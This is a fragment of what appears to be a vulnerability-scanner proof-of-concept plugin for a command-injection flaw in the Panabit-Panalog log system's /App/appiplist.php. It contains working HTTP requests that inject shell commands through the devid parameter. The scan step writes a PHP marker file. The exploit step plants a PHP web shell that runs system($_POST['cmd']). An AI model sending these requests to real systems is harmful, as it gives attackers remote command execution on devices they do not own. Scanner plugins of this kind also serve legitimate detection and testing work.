...
func init() {
    ...
    "ScanSteps": [
        ...
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/App/appiplist.php?devid=;echo%20%27%3C?php%20echo%20md5(233);unlink(__FILE__);?%3E%27%3E{{{setcookie}}}.php;",
                "follow_redirect": false,
                "header": {
                    "Cookie": "{{{setcookie}}}"
                },
    ...
    "ExploitSteps": [
        ...
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/App/appiplist.php?devid=;echo%20%27%3C?php%20system($_POST['cmd']);unlink(__FILE__);?%3E%27%3E{{{setcookie}}}.php;",
                "follow_redirect": false,
                "header": {
                    "Cookie": "{{{setcookie}}}"
                },
    ...
    "Translation": {
        "CN": {
            "Name": "Panabit-Panalog日志系统 applist.php 命令执行",
            "Product": "Panabit-Panalog",
